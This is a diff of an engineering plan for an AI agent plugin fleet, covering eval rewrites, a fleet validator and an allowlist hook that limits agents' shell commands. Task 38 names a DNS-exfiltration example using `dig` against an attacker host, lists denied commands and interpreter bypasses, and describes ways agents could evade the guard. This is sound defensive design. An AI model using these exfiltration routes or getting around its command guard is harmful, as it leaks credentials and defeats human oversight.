-- [ ] **Step 2: Write 24 discovery cases** — one per model-invocable skill, format unchanged (`id`, `expected`, `prompt`; the prompt must NEVER name the skill or its title words — the old rig's format, e.g. legacy `obs-grafana-dashboards.yaml`). Old-fleet agent-level cases have no proxy (`.agent.md` is Copilot-only): rewrite each as a skill-level case where the lane has a skill (e.g. old `agent-sre-engineer` → `discover-incident-command` or an obs case), else drop — **state the per-case disposition in a `evals/discovery/README.md` table** (declared substitution: the spec says dispositions go in "the machinery ledger" — these README tables are that ledger's eval pages; the Task 3 Step 4 spec edit may add a pointer. Nothing dropped by silence).
+- [ ] **Step 2: Write 24 discovery cases** — one per model-invocable skill, format unchanged (`id`, `expected`, `prompt`; the prompt must NEVER name the skill or its title words). The same case definitions may drive both runtime runners, but results are labeled and reported separately. Rewrite old agent-targeted cases against the matching generated agent or a surviving skill; otherwise drop with an explicit disposition in `evals/discovery/README.md`. Nothing is dropped by silence.
 - [ ] **Step 3: Write 2 invocation cases** (`invoke-pcf-deploy`, `invoke-service-onboarding`): prompt = the explicit `/sre-agents:<name>` invocation; grader asserts the skill *loaded* (invocation canary). By design these cannot fire on a bare prompt — a discovery bar over all 26 would be unsatisfiable and Phase 6 could never exit (Section 8's second row).
-- [ ] **Step 4: Rewrite `evals/scenarios/*.yaml` per surviving unit** (the behavioral regression suite — Section 4 keeps three separate gates *because they eval'd well separated*; dropping their evidence machinery would gut that argument). The three gate-blocking scenarios retarget by name only (merge-gate/release-gate/production-change-gate survive under the same names) — **keep the line-anchored verdict regex and the adversarial `_BLOCK_CASES` hardening** (audit Tier-1 #3: an unanchored `block` once matched "no blockers"); the injection-refusal and handoff-taint cases retarget to the new units (reviewer-lens skills, the taint block from Task 8); cases for deleted units (`researcher`, `route-request`, …) are deleted. **Two 0971a4d cases join the gate set [graft from PR #61, riding Task 21's predicate]: `merge-gate-blocks-stale-approval` and `merge-gate-passes-rebased`.** **Three previously-unstated dispositions, decided [graft from PR #61]:** `readonly-agent-recommends-not-acts` → **deleted** (agent-targeted; `.agent.md` has no Claude proxy — the spec's own rule), `runbook-author-resolved-postmortem-structure` → **retargeted** at the `postmortem` skill, `sde-ladder-principal` → **retargeted** at `eng-ladder`. Per-case disposition table in `evals/scenarios/README.md` — nothing dropped by silence.
-- [ ] **Step 5: Fix `discovery_probe.py`'s two hardcoded paths** (`SKILLS_DIR = ROOT / ".claude/skills"`, `AGENTS_DIR = ROOT / ".claude/agents"`, lines 60–61) → `ROOT / "skills"`, `ROOT / "agents"` (the plugin layout; the Claude proxy loads it via `--plugin-dir .`). Then run its companion `py -3 evals/test_discovery_probe.py` — it is a Gate-A step and must stay green; the inventory says it is pure trace-parsing (path-free), but verify rather than assume, and fix any fixture that pinned the old paths.
+- [ ] **Step 4: Rewrite `evals/scenarios/*.yaml` per surviving unit** (the behavioral regression suite). Keep the line-anchored gate verdict regex and adversarial `_BLOCK_CASES`; retarget injection-refusal and handoff-taint cases; delete cases for deleted units explicitly. `readonly-agent-recommends-not-acts` now targets the generated reviewer in each runtime rather than being deleted for lack of a proxy; `runbook-author-resolved-postmortem-structure` retargets `postmortem`; `sde-ladder-principal` retargets `eng-ladder`. Results remain runtime-separated. Per-case disposition table in `evals/scenarios/README.md` — nothing dropped by silence.
+- [ ] **Step 5: Fix `discovery_probe.py`'s hardcoded paths**: shared skills resolve from `ROOT / "skills"`; agent inventory resolves from canonical data and selects `generated/claude/agents` for Claude runs or `generated/copilot/agents` for native Copilot runs. Do not point either runner at the other runtime's wrapper. Run `py -3 evals/test_discovery_probe.py` and fix only fixtures that actually break.
 - [ ] **Step 6: Retarget the Gate-A eval step NOW, not in Task 37** (ordering: the rewritten scenarios name new-fleet targets, so a `FLEET_ROOT=legacy` validation would fail from this commit on): in `gate_a.py`, `("Eval suite parses (legacy targets)", [...], LEGACY)` → `("Eval suite parses", ["evals/run_evals.py", "--validate"], None)`.
 - [ ] **Step 7: Tripwire** — `evals/test_discovery_cases.py` (stdlib unittest, CI-safe): every discovery case's `expected` and every scenario's `target` resolves to a real `skills/<name>/SKILL.md`; every model-invocable skill has exactly one discovery case; the two invocation cases target exactly the two `disable-model-invocation` skills; no discovery prompt contains its target's name. Wire into `gate_a.py`: `("Discovery cases resolve", ["evals/test_discovery_cases.py"], None),`
 - [ ] **Step 8:** Gate A green; commit — `git commit -m "eval corpus rewritten per surviving unit: 24 discovery + 2 invocation canaries, scenarios ported with anchored graders; per-case dispositions recorded"`
@@ -1329,14 +1379,14 @@ to catch.
 - [ ] **Step 1: Port `scripts/eval_routing.py`** from `SDE: scripts/eval_routing.py` — the cluster-JSON runner (`--runs`, `--plugin-dir`, rates-over-runs reporting; positives pass at threshold, negatives pass only at 0%). Adapt: default cluster dir `evals/routing/`, plugin name `sre-agents`.
 - [ ] **Step 2: Write the five cluster files** in the sde-agents format (the shipped `prompt-tooling.json` is the model — `cluster`/`members`/`cases` with `polarity`, `expect_fires`, `expect_not_fires`, `tags`). Clusters and the overlap each measures: `obs-signals` (the six obs skills — the redesign's biggest fan-out risk), `gates` (three gates — "eval'd well separated" must stay true), `craft-layers` (craft / backend-craft / frontend-craft — pinned boundary #1), `incident-docs` (incident-command / postmortem / runbook), `agent-tooling` (agent-authoring / agent-security). **Negatives are cross-cluster positives**: each cluster's near-misses are drawn from the other clusters' positive prompts (one case set nets the whole fleet — the completion-sweep refinement). 6–8 positives + 6–8 negatives per cluster; each positive's prompt is a realistic request that never names the member.
 - [ ] **Step 3: The fan-out grader.** Add to `evals/graders.py`: `max_skills` — from a transcript, count *distinct fleet* `Skill(...)` invocations; pass iff ≤ N. Extend `evals/test_graders.py` with its adversarial cases (exactly-N passes, N+1 fails, non-fleet skills not counted) — that file is a Gate-A step and survives per the ledger *including* its `_BLOCK_CASES` discipline. Add one dedicated case (in `incident-docs`): a single realistic incident prompt (the recorded six-skill-pile-up class) with `max_skills: 2` — Section 8's fan-out bar.
-- [ ] **Step 4: `evals/README.md` rewritten** for the new rig; keeps verbatim the two operating rules: model-driven modes are advisory, never a CI gate (only `--validate` is CI-safe), and clean-room trials run through `evals/clean_room.py` (which survives unchanged, load-bearing) from a throwaway worktree. Carry the honest limitation forward in print: **this measures Claude Code as a proxy — nothing measures Copilot's own routing until the Copilot-CLI probe (open item, recorded here).**
+- [ ] **Step 4: `evals/README.md` rewritten** for the new rig; keeps the two operating rules: model-driven modes are advisory, never a CI gate, and Claude trials run through `evals/clean_room.py`. State the boundary in print: Claude runs measure Claude only; native Copilot runs measure Copilot and are manual until a documented headless interface exists. Never combine the rates or use one as proxy evidence for the other.
 - [ ] **Step 5:** `py -3 scripts/eval_routing.py evals/routing/obs-signals.json --runs 1 --limit 2` smoke (parses, spawns, grades); Gate A green; commit — `git commit -m "routing evals: five clusters, cross-cluster negatives, max_skills fan-out grader; manual-only by doctrine"`
 
 ### Task 36: GATE D — run #1, over the content-complete fleet
 
 **Files:** none modified — this task produces evidence (a `docs/superpowers/gate-d-1.md` record).
 
-- [ ] **Step 1: Clean-room discovery run** — from a throwaway worktree **with the root `AGENTS.md`/`CLAUDE.md` stubbed to one neutral line each**: they still carry the old fleet's roster/routing prose until Task 46, the Claude proxy loads workspace `CLAUDE.md` (+ its `@AGENTS.md` import) as project instructions, and `clean_room.py` relocates only the user config dir — so unstubbed root docs would steer routing toward 37 dead unit names during the exact measurement being taken. Record in `gate-d-1.md` that D#1 ran with stubbed root docs (pilot re-measures with the real Task-46 rewrite). Then: all 26 canary cases through `discovery_probe.py` inside `clean_room.clean_env()` (the operator's personal `~/.claude` skills — `root-cause`, `eng-ladder`, `runbook` — shadow the fleet otherwise; that is what PR #52 proved), ≥3 runs, rates recorded.
+- [ ] **Step 1: Runtime-separated discovery runs.** Claude: use a throwaway worktree with root `AGENTS.md`/`CLAUDE.md` stubbed neutral and `clean_room.clean_env()`, then run all 26 cases against the generated Claude projection ≥3 times. Copilot: run the same applicable corpus through native Copilot against the generated Copilot projection and record manual transcripts/rates separately. Root-doc contamination and personal Claude shadowing apply to the Claude run; do not generalize those controls or results to Copilot without evidence.
 - [ ] **Step 2: Routing + fan-out run** — all five clusters, `--runs 3`. Bars (Section 8): **0 of 24** discovery skills dark; both invocation canaries load; **no negative fires at all**; positives ≥ the old-fleet clean-room baseline; incident fan-out ≤ 2. **On the baseline comparand, stated:** the old-fleet clean-room numbers (PR #52 records) are *discovery* rates — they are the comparand for the discovery run; the five new clusters have no old-fleet twin, so their positives are held to the absolute bars (no dark member, no firing negative) and become their own baseline for every later run. Record this interpretation in `gate-d-1.md`.
 - [ ] **Step 3: Token measure — with a real tokenizer [graft from PR #61]** — count the 31 shipped descriptions (26 skills + 5 agents) with an actual tokenizer (`npx @anthropic-ai/tokenizer`, or tiktoken over the concatenated text); fall back to the ~4-chars/token estimate **only** if none is installed, and **say which instrument produced the number**. Bar: ≤ 4.5k total, no single description over 150. (The in-Copilot measurement repeats at pilot; this is the creep gate.)
 - [ ] **Step 4: Iterate on failures, bounded.** A dark skill or firing negative → edit that description (trigger phrasings, boundary clauses), re-run the affected cluster/case. Three failed iterations on one skill → stop; take the finding to the owner (the boundary may be wrong, not the description — that is a spec change, not a tuning loop).
@@ -1350,38 +1400,39 @@ to catch.
 - Modify: `scripts/gate_a.py` (retarget steps); Delete: `scripts/check_links.py`, `scripts/test_check_links.py` (absorbed)
 
 **Interfaces:**
-- Consumes: the shipped fleet + `.claude-plugin/` manifests. Produces: the "Fleet structure" Gate-A step over the NEW fleet (the legacy `FLEET_ROOT` step retires here — the frozen tree needs no structural re-validation; `test_no_regressions.py`'s self-arm still reads it). `--write-inventory` regenerates the README fleet table (Task 45 depends on it).
+- Consumes: canonical fleet inputs + both generated projections. Produces: the "Fleet structure" Gate-A step over the NEW fleet and keeps generator `--check` load-bearing. `--write-inventory` regenerates the README fleet table.
 
 - [ ] **Step 1: Rewrite `scripts/validate_fleet.py`.** Chassis: the sde-agents validator's architecture (schema-vs-policy error separation, fixture-driven tests, `--write-inventory`). Checks, exhaustively — each is a test fixture in Step 2:
-  1. **Agents (`agents/*.agent.md`)**: frontmatter parseable; unknown keys rejected against `KNOWN_AGENT_FIELDS = {description, tools, model, agents, handoffs}` + whatever Task 3 pinned (a typo silently disarms — the `hooks:`→`hook:` war story); `tools:` present and drawn from the pinned vocabulary; `model:` a non-empty array; every `agents:`/`handoffs:` target is a real fleet agent; **no edge beyond the spec's delegation graph** (the graph is data in the validator — default deny, machine-enforced); `reviewer` must hold neither `execute` nor `edit`, `scribe` must not hold `execute`, and neither may declare `agents:`; evidence-label canonical stems present in every agent body; required packet/output heading present; kebab-case filenames.
+  1. **Canonical + projected agents**: canonical keys/names/bodies valid; every agent explicitly named; targets exist; graph matches the spec; reviewer/scribe are terminal. Copilot wrappers use `.agent.md`, runtime-valid model arrays, Copilot-only handoffs, and automatically contain `agent` whenever `agents:` is nonempty. Claude wrappers use `.md`, Claude-valid model values, `Agent(target)` for delegates, no handoffs, and record nested target-list degradation. Body bytes match canonical input; stale/unexpected wrappers fail.
+  1b. **Canonical skill inventory**: the runtime-visible skill-directory set and every bundled reference/asset/script exactly match canonical inventory; every agent skill dependency names an inventoried skill; missing and unexpected entries fail before content linting.
   2. **Skills (`skills/*/SKILL.md`)**: name kebab-case + matches dir; description present, ≤150 tokens, **trigger-format lint** (must contain `Triggers:` with at least two quoted phrasings — the one pattern with 3/3 baselines); unknown keys rejected against `{name, description, disable-model-invocation, compatibility}`; exactly `pcf-deploy` and `service-onboarding` set `disable-model-invocation`; **cross-component bare-name lint, scoped to `description:` fields only [graft from PR #61]** — a description naming another fleet unit must namespace it (`sre-agents:obs-logs`, not bare `obs-logs`), because descriptions are the routing surface shown in a listing where the engineer's *personal* skills coexist, and un-namespaced sibling references are exactly the ambiguity that made shadowing this repo's most expensive measurement bug. (Body prose may name siblings bare — the SDE rule this imports says so.) **Applying it means namespacing the sibling references in the descriptions drafted in Tasks 10–32.**
   3. **5d rules (absorbed from `check_links.py`, all errors)**: bundled-path-as-code-span; dead relative link; orphan bundled file.
-  4. **Plugin integrity**: `.claude-plugin/plugin.json` has name/version/author; **no root `plugin.json`**; `.claude-plugin/marketplace.json` source is `github` + `ref` (a `"./"` source is a policy error — the 24h-unreviewed-delivery hazard); `hooks/hooks.json` command resolves the guard **only** through `${CLAUDE_PLUGIN_ROOT}` (a repo-supplied guard is the attack); no fleet definition resolves a file outside the plugin root.
+  4. **Plugin integrity**: root `plugin.json` points to the Copilot agent directory; `.claude-plugin/plugin.json` lists explicit Claude agent files; name/version/author match canonical metadata; marketplace source is `github` + `ref`; neither manifest mentions hooks; root `hooks.json` and `hooks/hooks.json` validate against their own runtime schema; no definition escapes plugin root.
   5. **Inventory**: README fleet table between `<!-- fleet-inventory:start/end -->` matches the tree; `--write-inventory` regenerates.
-- [ ] **Step 2: Broken-fleet fixtures FIRST, red-first** under `tests/fixtures/`, one per check family (sde-agents pattern): `unknown-agent-key/`, `extra-delegation-edge/`, `readonly-holds-execute/`, `evidence-drift/`, `missing-packet/`, `description-no-triggers/`, `code-span-pointer/`, `dead-link/`, `orphan-reference/`, `root-plugin-json/`, `relative-marketplace-source/`, `guard-not-plugin-root/`, `inventory-drift/`, plus `valid/`. **Order: land the fixtures and the rewritten `scripts/test_validate_fleet.py` before finishing Step 1's rewrite, and run them red once against the old validator** (probes-first applies to the validator most of all — a test suite written after the validator describes what it does, not what it must do); Step 1 then turns them green. Each fixture must fail with its named error; `valid/` must pass. The `guard-not-plugin-root` / hooks.json check is **conditional-on-existence until Task 38** (hooks/ holds only `.gitkeep` here); Task 38 adds a `missing-hooks-json` fixture making absence an error from then on.
-- [ ] **Step 3: Retarget Gate A.** STEPS: "Fleet structure (legacy, frozen)" → `("Fleet structure", ["scripts/validate_fleet.py"], None)` over the new fleet (drop `FLEET_ROOT`); drop the 5d step (absorbed). (The "Eval suite parses" step already flipped off `FLEET_ROOT` in Task 34 Step 6.) **Make the inventory check satisfiable now:** insert the `<!-- fleet-inventory:start/end -->` markers into the current README (a mechanical insert; the full rewrite stays Task 45) and run `--write-inventory` once — without this, Step 4's "full suite green" is unreachable, since the old README has no markers. Run the two-layer check: `claude plugin validate . --strict` still passes (the Claude-format layer VS Code auto-detects), and record whether VS Code ships its own plugin-validate equivalent — `[verified]` with the command, or `[unverified: none found <date>]` (the spec's open question, answered or honestly parked).
+- [ ] **Step 2: Broken-fleet fixtures FIRST, red-first** under `tests/fixtures/`, including unknown canonical key, missing explicit name, extra edge, readonly capability, Copilot-delegates-without-agent, Claude-bad-delegation, handoff-leaked-to-Claude, runtime-model-shape, manifest-version-skew, wrong manifest-agent-shape, wrapper drift, hook-mentioned-in-manifest, missing runtime hook, plus the existing doctrine/link/inventory families and `valid/`. Run red against the old validator, then green.
+- [ ] **Step 3: Retarget Gate A.** Run validator v2 over canonical inputs and both projections; keep `scripts/generate_fleet.py --check` as its own step. Insert README inventory markers and run `--write-inventory`. Then run separate platform checks: `claude plugin validate . --strict` for Claude and the native Copilot plugin + fallback acceptance probes for Copilot. Do not describe Claude strict validation as a Copilot layer.
 - [ ] **Step 4:** `py -3 scripts/gate_a.py` — full suite green over the new fleet for the first time. Commit — `git commit -m "validator v2: Copilot artifacts as structural law -- delegation graph, tool scopes, trigger lint, 5d, plugin/marketplace integrity; fixture-tested"`
 
 ### Task 38: The allowlist hook — guard, launcher, wiring tests, payload probes
 
 **Files:**
 - Create: `scripts/allowlist_guard.py`, `scripts/test_allowlist_guard.py`, `scripts/test_hook_wiring.py`
-- Modify: `hooks/hooks.json`, `scripts/gate_a.py` (two steps)
+- Modify: root `hooks.json`, `hooks/hooks.json`, `scripts/gate_a.py` (runtime-specific wiring tests)
 
 **Interfaces:**
 - Consumes: the sde-agents guard chassis (verbatim import, then enumerated deltas); the observed Phase-1–3 command log (Step 1). Produces: the guard `setup.ps1 -Verify` (Task 43) reads the audit log of; the hook `hooks.json` ships to every engineer's machine (CODEOWNERS-protected, Task 44).
 
 - [ ] **Step 1: Seed the allowlist from observation.** Collect what `sre`/`observer` actually ran during Phases 1–3 real use (the operator's session history/notes). Union with the spec 5a seed table — `sre`: `cf` read verbs (`app`, `apps`, `events`, `logs` — `cf curl` and `cf env` DENIED: env leaks credentials to an agent with egress), `git log/diff/show/blame/status`, `gh run|pr view/list`, `rg`/`grep`, `ls`/`cat`/`head`/`find` (no `-exec`), `jq`, `dig`, `ss`; `observer`: the `sre` set **plus** `promtool check`, `jq empty`, `grafana` CLI lint (the validators the old guard wrongly denied — why `sre-monitor` could never take it). **One recorded delta from the 5a seed table (owner-visible, not silent): `dig` and `ss` stay on `sre` but are dropped from `observer`.** Observer's trifecta break is holding no `web`; an allowlisted `dig <encoded-data>.attacker.example` is a DNS-egress channel that needs no shell substitution, so the structure-deny never sees it — the guard's own allowlist would silently complete the trifecta. (For `sre`, which holds `web` anyway, `dig` adds no egress it lacks.) If the owner prefers the spec's table verbatim, record the acceptance the way Section 5c records web-on-sre. Record the observed-vs-seeded delta in the commit body. Everything else denied — **including all interpreters (`python -c`, `-m <module>` — the audit's live bypass class), local scripts, and build/test runners.** A blocked legitimate read is a loud one-line fix; a missed writer is silent.
-- [ ] **Step 2: Probe the payload FIRST (the field names are load-bearing and undocumented).** Register a temporary logging hook (append raw stdin to a file, exit 0 empty) via the fallback channel; run one terminal command as `sre` in VS Code and one in a plain (non-agent) session. Record verbatim: the tool-name field and value (camelCase expected), the agent-identity field and value (namespaced — `sre-agents:sre` vs bare `sre`?), the command field path. **Two pre-stated STOP rulings [grafted from PR #61 — decide them now, not mid-build]:** (i) **if NO field identifies the calling agent at all**, per-agent guarding is impossible — Section 5b's no-op ruling covers a *renamed* field, not a *never-present* one: **stop and amend spec Section 5** (fallback options to take to the owner: guard `execute` for all chat sessions in fleet workspaces, or drop to audit-only) before writing the guard. (ii) **if plugin-shipped hooks do not fire at all** (test it: install the bundle locally; plugin and user-level hooks coexist), the plugin channel would ship `sre`/`observer` holding execute with **no guard** — the same hole the spec called out on the fallback channel: **ruling, pre-decided — `setup.ps1`'s plugin path also registers the user-level hook (`~/.copilot/hooks`) pointing at the installed plugin copy of the guard, and Section 5 is amended to say so.** Also record **which shell executes the hooks.json command string on Windows** (Git Bash sh? cmd? — the launcher is written in `sh`, Windows is where the old guard shipped silently dead, and CI's green Windows leg proves nothing about it because Actions runners always have Git Bash; if there is no sh on a real workstation, the launcher needs a decided fallback form, here). Pin all three into `allowlist_guard.py` constants **with the recorded payload pasted as a comment**, and into `scripts/probe_copilot.py`'s re-run list (Task 39) — probes re-run after every VS Code/Copilot upgrade.
+- [ ] **Step 2: Probe the payload FIRST (the field names are load-bearing).** Current VS Code documentation uses snake_case fields such as `tool_name` and `tool_input`, but does not document a global-hook agent-identity field. Register a temporary logging hook (append raw stdin to a file, exit 0 empty) via the fallback channel; run one terminal command as `sre` in VS Code and one in a plain (non-agent) session. Record verbatim: the actual tool-name field/value, any agent-identity field/value, and the command field path; documentation is a starting contract, not evidence that identity exists. **Two pre-stated STOP rulings [grafted from PR #61 — decide them now, not mid-build]:** (i) **if NO field identifies the calling agent at all**, per-agent guarding is impossible — Section 5b's no-op ruling covers a *renamed* field, not a *never-present* one: **stop and amend spec Section 5** (fallback options to take to the owner: guard `execute` for all chat sessions in fleet workspaces, or drop to audit-only) before writing the guard. (ii) **if plugin-shipped hooks do not fire at all** (test it: install the bundle locally; plugin and user-level hooks coexist), the plugin channel would ship `sre`/`observer` holding execute with **no guard** — the same hole the spec called out on the fallback channel: **ruling, pre-decided — `setup.ps1`'s plugin path also registers the user-level hook (`~/.copilot/hooks`) pointing at the installed plugin copy of the guard, and Section 5 is amended to say so.** Also record **which shell executes the hooks.json command string on Windows** (Git Bash sh? cmd? — the launcher is written in `sh`, Windows is where the old guard shipped silently dead, and CI's green Windows leg proves nothing about it because Actions runners always have Git Bash; if there is no sh on a real workstation, the launcher needs a decided fallback form, here). Pin all three into `allowlist_guard.py` constants **with the recorded payload pasted as a comment**, and into `scripts/probe_copilot.py`'s re-run list (Task 39) — probes re-run after every VS Code/Copilot upgrade.
 - [ ] **Step 3: Write `scripts/allowlist_guard.py`.** Chassis: `SDE: scripts/readonly-guard.py` **imported verbatim, then exactly these deltas** (everything else — `_SIMPLE_READERS`, `_GIT_READ` family, `_STRUCTURE_DENY` (substitution/redirection/subshell → deny by construction), path-form-command denial, positive-ALLOW `EXIT_ALLOW=42`/`EXIT_DENY=43` — survives as-is):
   1. `PLUGIN_NAME = "sre-agents"`; `GUARDED_AGENT_NAMES = frozenset({"sre", "observer"})`; per-agent allowlists (Step 1's two sets — observer ⊇ sre).
   2. **Self-scope on the tool name** (VS Code ignores hook matchers — the hook fires on every tool): not-the-execute-tool → allow immediately, using Step 2's recorded field/value.
-  3. **Payload fields**: the camelCase names from Step 2 (not the Claude snake_case).
+  3. **Payload fields**: the exact names observed in Step 2 (current VS Code documentation is snake_case); keep Claude input/output handling in its own projection.
   4. **Identity-indeterminate → NO-OP + loud audit line** (spec 5b — this REPLACES the chassis's fail-closed identity canary): if the recorded identity field is absent from the payload, allow, and append `{"event":"identity-missing","expected_field":...,"payload_keys":[...]}` to the audit log. Denying the user's own session gets the hook uninstalled — a permanent guard traded for a temporary one. The never-touch guarantee is deliberately the stronger one; `-Verify` (Task 43) exits non-zero on any identity-missing entry, which is what triggers the probe re-run.
   5. **A command it cannot parse → DENY** (fail closed on commands, no-op on identity — Risk 4's two rulings are different, on purpose).
   6. **Audit log**: every decision appends one JSON line (`ts`, `agent`, `verb`, `decision`) to `~/.sre-agents/guard.log`.
-- [ ] **Step 4: Write `hooks/hooks.json`.** The launcher is the inline `sh` command (chassis: the sde-agents launcher, with the exit-code translation rewritten for the **VS Code contract — do NOT port the Claude exit-code semantics**): read stdin; cheap prefilter **on the execute-tool marker from Step 2, not on agent names** (a name-based prefilter goes blind in exactly the renamed-identity case the audit line exists to catch: identity field dropped + name absent → guard never invoked, no audit line ever written; tool-name filtering keeps every terminal command flowing to the guard, which then no-ops fast on non-fleet identities); try **`py`, `python3`, `python`** with `-I -S` running `"${CLAUDE_PLUGIN_ROOT}/scripts/allowlist_guard.py"` (**Windows-first order [graft from PR #61]** — this shop's workstations are Windows, where `python3` is the Microsoft Store stub; the hook fires on *every* terminal command, so the wrong order pays two failed spawns each time, on the platform where the old guard already died once); guard exit **42** → emit `{"permissionDecision":"allow"}` and exit 0; exit **43** → emit the guard's deny JSON and exit 0; **no interpreter answered with a guard code → the launcher itself emits a deny JSON for guarded-agent payloads** (fail closed: a missing/broken interpreter must not read as ALLOW — exactly how the old guard shipped dead on Windows) and exits 0 empty otherwise (never-touch). **The shell-side guarded-vs-not decision is fixed-string matching on the Step-2 recorded identity field + values** (the sde-agents launcher's `case` pattern, retargeted to the recorded payload shape — both spacing variants, namespaced and bare) — written verbatim in hooks.json, no improvised parsing. Never resolve the guard anywhere but `${CLAUDE_PLUGIN_ROOT}` (a workspace under review could supply its own). The user-level fallback registration (`~/.copilot/hooks`, pointing at the fixed clone — "never a copy the workspace under review supplies", not "never outside a plugin") is `setup.ps1`'s job (Task 43).
-- [ ] **Step 5: Tests.** `scripts/test_allowlist_guard.py`: the sde-agents corpus adapted (58 ALLOW / 136 DENY, from `C:/Users/hawkins/sde-agents/tests/test_readonly_guard.py` — note `tests/`, not `scripts/`) + the 5a additions as ALLOW cases (per-agent: `promtool check` allowed for observer, DENIED for sre) + regression cases for the audit's Tier-1 #4 bypass class (`python -m pip install`, `-m venv`, `-m http.server` — all DENY) + `cf env` DENY + identity-missing → no-op-with-audit-line. `scripts/test_hook_wiring.py`: run the **exact command string from `hooks.json`** through `sh -c` with synthetic stdin payloads (testing the script is not testing the hook): guarded deny verb → deny JSON on stdout; guarded allowed verb → allow JSON; non-fleet payload → exit 0, empty; simulated interpreter absence (PATH stripped) + guarded payload → deny JSON (fail closed); **interpreter absence + non-fleet payload → exit 0, empty** (the two guarantees collide exactly at this corner — test both sides); **and never-executes-a-workspace-copy [graft from PR #61]: plant a poisoned guard in a fake workspace checkout and assert it is NOT what ran** — "resolve only through `${CLAUDE_PLUGIN_ROOT}`" is the whole defense against a repo-under-review supplying its own guard, and until this test exists it is an unverified claim. Getting any of these wrong is worse than no guard. **Discipline note: write both test files before finalizing the guard/launcher deltas and run them red once against the unmodified chassis** — a corpus adapted after the guard exists describes what the guard does, not what it must do; paste the red output in the commit. Wire both into `gate_a.py` STEPS (replacing the old "Read-only guard" step).
+- [ ] **Step 4: Write two hook projections, never a shared hook file.** Root `hooks.json` uses the VS Code hook schema, the exact field names observed in Step 2, and VS Code allow/deny JSON; `hooks/hooks.json` uses Claude's schema and Claude exit/output contract. Both are auto-discovered and therefore absent from both manifests. `${CLAUDE_PLUGIN_ROOT}` is valid only in the Claude hook. Because Copilot documents no equivalent plugin-root token, its plugin projection must either be self-contained or use an install path proven by the Task-2b native-plugin spike; otherwise STOP and register the user-level hook at a fixed trusted path for the plugin channel too. The fallback user hook points at the fixed clone. Never resolve or execute a guard from the workspace under review.
+- [ ] **Step 5: Tests.** `scripts/test_allowlist_guard.py`: the sde-agents corpus adapted (58 ALLOW / 136 DENY, from `C:/Users/hawkins/sde-agents/tests/test_readonly_guard.py` — note `tests/`, not `scripts/`) + the 5a additions as ALLOW cases (per-agent: `promtool check` allowed for observer, DENIED for sre) + regression cases for the audit's Tier-1 #4 bypass class (`python -m pip install`, `-m venv`, `-m http.server` — all DENY) + `cf env` DENY + identity-missing → no-op-with-audit-line. `scripts/test_hook_wiring.py`: materialize and run the **current-OS command selected from root `hooks.json` exactly as VS Code runs it**, then separately materialize and run the Claude handler from `hooks/hooks.json` after plugin-root substitution (testing the guard script alone tests neither hook): guarded deny verb → deny JSON on stdout; guarded allowed verb → allow JSON; non-fleet payload → exit 0, empty; simulated interpreter absence (PATH stripped) + guarded payload → deny JSON (fail closed); **interpreter absence + non-fleet payload → exit 0, empty** (the two guarantees collide exactly at this corner — test both sides); **and never-executes-a-workspace-copy [graft from PR #61]: plant a poisoned guard in a fake workspace checkout and assert it is NOT what ran** — the trusted installed/fixed paths are the defense against a repo-under-review supplying its own guard, and until both runtime projections prove them this is an unverified claim. Getting any of these wrong is worse than no guard. **Discipline note: write both test files before finalizing the guard/launcher deltas and run them red once against the unmodified chassis** — a corpus adapted after the guard exists describes what the guard does, not what it must do; paste the red output in the commit. Wire both into `gate_a.py` STEPS (replacing the old "Read-only guard" step).
 - [ ] **Step 6:** `py -3 scripts/gate_a.py` green; commit — `git commit -m "allowlist hook: sde-agents chassis + 5a per-agent allowlists; VS Code JSON contract (exit codes NOT ported); fail-closed launcher; no-op-with-audit-line on missing identity (5b); wiring tested as the runtime runs it"`
 
 ### Task 39: Reference-read canaries + the stack-profile REQUIRED canary
@@ -1395,7 +1446,7 @@ to catch.
 
 - [ ] **Step 1: Plant canaries and record them in `evals/canaries.json` as you go** (file → canary string; the manifest is the tripwire's input). Every `references/*.md` in the fleet gets one distinctive inert value inside a worked example (pattern: `q_<skill-abbrev>_<4hex>`, e.g. `q_bcapi_9e2d` as a request-id in consuming-apis.md's example). Phase-3 files already carry them (their tasks required it) — add them to the manifest; sweep Phase-2 imports and add values where missing. `stack-profile`'s SKILL.md canary (`sp_7c2e`, Task 10) goes in the manifest too. A canary is content, not a marker comment — it must be something a model would quote when using the file. **Greppability rule [graft from PR #61]: every registry string must be contiguous on ONE line of the post-port file — `grep -F` each canary against the fleet before committing the registry.** A wrapped or emphasis-broken string is not a canary; PR #61 hit exactly this three times (a line-wrapped phrase, a `**BLOCK**` bold marker splitting a match, a sentence wrapped across two lines) and every one would have produced a silently dead oracle.
 - [ ] **Step 2: Tripwire test** — `evals/test_canary_tripwires.py` (CI-safe): reads `evals/canaries.json`; asserts every canary is still present verbatim in its file — an innocent copy-edit must not silently disarm the oracle — and every `references/*.md` in the fleet appears in the manifest. **Plus a predicate-row completeness tripwire [graft from PR #61]: every predicate-table row in every `SKILL.md` must have a matching probe case** (skill · row predicate · reference path · the prompt that trips exactly that predicate) — otherwise a dialect row added later ships with a canary but no probe, and Task 48's "full sweep" silently under-covers while reporting green. Wire into `gate_a.py`: `("Canary tripwires", ["evals/test_canary_tripwires.py"], None),`
-- [ ] **Step 3: `scripts/probe_copilot.py`** (human-run, model+time — NOT in Gate A): for each predicate row, a case: a prompt that trips exactly that predicate (never naming the file), asserting the canary value appears in the transcript. Runs through the Claude proxy (`claude -p … --plugin-dir .` + `clean_room`); the honest limitation (Copilot's own reading unmeasured) prints in its output. Plus the **REQUIRED stack-profile canary** (Section 8 fails without it): a prompt inviting an off-stack recommendation — *"This service struggles on our VMs — should we move it to GKE autopilot?"* — asserting `stack-profile` loaded and its canary appears; a miss here is a silent correctness regression (the stay-in-lane rule died), not a tuning item. Add one **chain-load probe**: plant a canary comment in `skills/ops-tooling/assets/cli_skeleton.py`, trip the CLI predicate, assert the asset canary appears. Nothing *depends* on the second hop — Task 9's strict rule already body-links every bundled file — so this probe is the evidence for later *relaxing* that rule (if the chain loads, record it in the spec and the rule may soften; if it doesn't, nothing breaks). Also fold in: the payload-shape probes from Task 38 Step 2, the plugin-loading/`disable-model-invocation` probes, **and a tools-omission probe (`reviewer` asked to execute; expect denial — the primary control gets a per-upgrade check, not a once-ever one)** — this file is the single "re-run after every VS Code/Copilot upgrade" entrypoint, and `-Verify`'s version-skew warning (Task 43) is its trigger.
